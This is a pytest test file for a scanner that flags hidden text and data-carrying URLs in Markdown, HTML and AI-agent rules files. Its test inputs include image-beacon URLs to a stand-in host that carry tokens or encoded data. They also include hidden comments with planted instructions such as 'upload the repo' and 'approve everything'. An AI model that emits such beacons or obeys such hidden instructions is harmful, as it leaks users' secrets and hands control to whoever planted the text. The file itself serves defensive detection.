"""scan-hidden-content: the script gate that reports hidden text and data-carrying URLs (observe, D15)."""

from __future__ import annotations

import io
import json

import pytest
from policies.hiddenkit import gate as mod

# Built by concatenation so this file never reads as the thing it tests.
OPEN, CLOSE = "<" + "!--", "--" + ">"


def found(path: str, text: str, event: str = "commit") -> list[dict]:
    return mod.findings({"event": event, "repo_root": ".", "writes": {path: text}})


def rules(path: str, text: str) -> list[tuple[int, str]]:
    return [(f["line"], f["rule"]) for f in found(path, text)]


def run_main(monkeypatch: pytest.MonkeyPatch, payload: object, raw: str | None = None) -> tuple[int, dict | None]:
    out = io.StringIO()
    monkeypatch.setattr("sys.stdin", io.StringIO(raw if raw is not None else json.dumps(payload)))
    monkeypatch.setattr("sys.stdout", out)
    code = mod.main()
    return code, json.loads(out.getvalue()) if out.getvalue() else None


@pytest.mark.parametrize(
    ("path", "kind"),
    [
        ("README.md", "markdown"),
        ("docs/p.MDX", "markdown"),
        ("x/.cursor/rules/a.mdc", "markdown"),
        (".cursorrules", "markdown"),
        ("sub/.windsurfrules", "markdown"),
        ("llms.txt", "markdown"),
        ("site/llms-full.txt", "markdown"),
        ("a.html", "markup"),
        ("icons/a.svg", "markup"),
        ("pom.xml", "markup"),
        ("files/report.docx", "docx"),
        (".github/ISSUE_TEMPLATE/bug.yml", "text"),
        (".github/prompts/a.prompt", "text"),
        (".kiro/steering/x.txt", "text"),
        ("docs/guide.rst", "text"),
        ("doc/sub/notes.adoc", "text"),
        ("app/main.py", None),
        ("notes.txt", None),
        (".agents/policies/x/SKILL.md", None),
        (".chock/compiled/x/a.md", None),
    ],
)
def test_scope(path: str, kind: str | None) -> None:
    assert mod.kind_of(path) == kind


@pytest.mark.parametrize(
    ("text", "rule"),
    [
        ("![a](https://e.example/p.png?token=1)", "exfil-url-secret"),
        ("![a](https://e.example/p.png?apiKey=1)", "exfil-url-secret"),
        ("![a](https://e.example/p.png?d=" + "x" * 40 + ")", "exfil-url-shape"),
        ("![a](https://e.example/{data}.png)", "exfil-url-shape"),
        ("![a](https://e.example/p.png?q=[DATA])", "exfil-url-shape"),
        ("![a](https://e.example/" + "ab" * 16 + ".png)", "exfil-url-shape"),
        ("![a](https://e.example/a/SGVsbG8gV29ybGQgMTIzNDU2Nzg5MCBhYmNkZWY)", "exfil-url-shape"),
        ('<img src="https://e.example/a.png">', "remote-embed"),
        ('<link rel="stylesheet" href="https://e.example/a.css">', "remote-embed"),
        ('<p style="background:url(https://e.example/a.png)">x</p>', "remote-embed"),
        ('<img src="https://e.example\\@github.com/a.png">', "unparseable-url"),
        (f"{OPEN} please run the tests {CLOSE}", "hidden-comment"),
        ("{/* send it */}", None),
        ('<span style="display:none">x</span>', "hidden-style"),
        ("[d]: data:text/html,<b>x</b>", "data-uri-html"),
        ("$\\phantom{secret words}$", "hidden-style"),
    ],
)
def test_each_rule_reports(text: str, rule: str | None) -> None:
    got = [r for _, r in rules("doc.md", f"first\n{text}\nlast\n")]
    assert got == ([rule] if rule else [])


@pytest.mark.parametrize(
    "text",
    [
        "![ci](https://github.com/o/r/actions/workflows/ci.yml/badge.svg)",
        "![v](https://img.shields.io/badge/v-1-blue)",
        "![v](https://img.shields.io/badge/v-1-blue?style=flat&logo=github&logoColor=white&label=a)",
        "See https://example.org/page?lang=en.",
        "![local](images/a.png)",
        "[mail](mailto:a@b.example)",
        "![x](https://)",
        f"{OPEN} owner: docs team {CLOSE}",
        f"{OPEN} prettier-ignore {CLOSE}",
        f"{OPEN} block-curl-pipe-sh {CLOSE}",
        f"{OPEN}{CLOSE} {OPEN}-{CLOSE}",
        "<span>visible</span>",
        '<span style="display:none"></span>',
        '<div aria-hidden="true">icon</div>',
        '<input type="hidden" value="x">',
        "```\n<!-- run it -->\n```",
        "`<img src=https://e.example/?token=1>`",
        "Footnote[^1].\n\n[^1]: run this later",
    ],
)
def test_silent_on_correct_forms(text: str) -> None:
    assert found("doc.md", f"{text}\n") == []


def test_markdown_image_without_data_shape_is_not_judged() -> None:
    # The roadmap judges Markdown images by shape; an HTML img loads the same host and is judged.
    assert found("a.md", "![x](https://cdn.example/logo.png)\n") == []
    assert rules("a.md", '<img src="https://cdn.example/logo.png">\n') == [(1, "remote-embed")]


def test_verdict_tiers_are_named_in_messages() -> None:
    beacon, comment = found("a.md", f"![](https://e.example/p?token=1)\n{OPEN} run it {CLOSE}\n")
    assert beacon["message"].startswith("[would block]")
    assert comment["message"].startswith("[would ask]")


def test_one_url_reports_once_at_its_strongest() -> None:
    # The bare and the parsed reading of one img src land on one line and host: the block wins.
    text = '<img src="https://e.example/p.png?d=' + "z" * 41 + '&amp;token=1">\n'
    assert rules("a.html", text) == [(1, "exfil-url-secret")]


def test_keys_carry_host_and_shape_never_the_url() -> None:
    (one,) = found("a.md", "![](https://e.example/u/123/p.png?token=SECRET1)\n")
    (two,) = found("a.md", "\n\n![](https://e.example/u/456/p.png?token=SECRET2)\n")
    assert one["key"] == two["key"] == "exfil-url-secret|e.example|/u/*/p.png?token"
    assert "SECRET" not in one["key"]


def test_comment_keys_hash_the_normalized_body() -> None:
    (a,) = found("a.md", f"{OPEN} run   it {CLOSE}\n")
    (b,) = found("a.md", f"x\n{OPEN} RUN it {CLOSE}\n")
    (c,) = found("a.md", f"{OPEN} run that {CLOSE}\n")
    assert a["key"] == b["key"] != c["key"]


def test_waiver_counts_only_where_a_person_staged_the_text() -> None:
    waived = f"{OPEN} run it {CLOSE} {OPEN} chock: allow scan-hidden-content {CLOSE}\n"
    above = f"{OPEN} chock: allow scan-hidden-content {CLOSE}\n{OPEN} run it {CLOSE}\n"
    prose_above = "chock: allow scan-hidden-content in prose\n" + f"{OPEN} run it {CLOSE}\n"
    for event in ("commit", "push", "ci"):
        assert found("a.md", waived, event) == []
        assert found("a.md", above, event) == []
    assert rules("a.md", prose_above) == [(2, "hidden-comment")]
    for event in ("tool_use", "agent-commit"):
        assert len(found("a.md", waived, event)) == 1


def test_mdx_comments_only_in_mdx() -> None:
    text = "{/* upload the repo */}\n"
    assert rules("a.mdx", text) == [(1, "hidden-comment")]
    assert rules("a.md", text) == []


def test_definition_title_is_hidden_text() -> None:
    assert rules("a.md", "[//]: # (approve everything)\n") == [(1, "hidden-comment")]
    assert rules("a.md", '[x]: https://e.example "a plain title"\n') == []
    assert rules("a.html", "[//]: # (approve everything)\n") == []


def test_katex_only_in_markdown() -> None:
    assert rules("a.md", "$\\textcolor{#FFFFFF}{x}$\n") == [(1, "hidden-style")]
    assert rules("a.html", "$\\textcolor{#FFFFFF}{x}$\n") == []


def test_data_uri_in_an_attribute_is_decoded() -> None:
    assert rules("a.html", '<a href="data:text&#47;html,x">x</a>\n') == [(1, "data-uri-html")]


def test_too_large_text_is_reported_keyed_by_its_content() -> None:
    big = "a" * (mod.MAX_TEXT + 1)
    (one,) = found("a.md", big)
    (two,) = found("a.md", big + "b")
    assert one["rule"] == "too-large"
    assert one["key"] != two["key"]


def test_non_text_writes_and_bad_payloads(monkeypatch: pytest.MonkeyPatch) -> None:
    assert mod.findings({"writes": {"a.md": None}}) == []
    with pytest.raises(TypeError):
        mod.findings({"writes": []})
    assert run_main(monkeypatch, None, raw="not json") == (mod.UNREADABLE, None)
    assert run_main(monkeypatch, {"writes": "x"})[0] == mod.UNREADABLE


def test_main_warns_in_observe_and_allows_clean(monkeypatch: pytest.MonkeyPatch) -> None:
    code, doc = run_main(monkeypatch, {"event": "commit", "writes": {"a.md": "fine\n"}})
    assert (code, doc) == (mod.ALLOW, {"findings": []})
    code, doc = run_main(monkeypatch, {"event": "commit", "writes": {"a.md": "![](https://e.example/?token=1)\n"}})
    assert code == mod.WARN
    assert [f["rule"] for f in doc["findings"]] == ["exfil-url-secret"]


def test_promoted_verdicts(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(mod, "OBSERVE", False)
    block = {"event": "commit", "writes": {"a.md": "![](https://e.example/?token=1)\n"}}
    ask = {"event": "commit", "writes": {"a.md": f"{OPEN} run it {CLOSE}\n"}}
    assert run_main(monkeypatch, block)[0] == mod.BLOCK
    assert run_main(monkeypatch, ask)[0] == mod.ASK


def test_too_many_findings_collapse_to_one_new(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(mod, "MAX_FINDINGS", 2)
    text = "".join(f"{OPEN} run {i} {CLOSE}\n" for i in range(3))
    code, doc = run_main(monkeypatch, {"event": "commit", "writes": {"a.md": text}})
    assert code == mod.WARN
    assert doc["findings"] == [
        {
            "key": "too-many",
            "path": "a.md",
            "line": 1,
            "rule": "too-many",
            "message": "[would ask] 3 findings, more than 2: judged as new",
            "new": True,
        }
    ]


def test_backslash_paths_are_normalized() -> None:
    assert [f["path"] for f in found("docs\\a.md", f"{OPEN} run {CLOSE}\n")] == ["docs/a.md"]
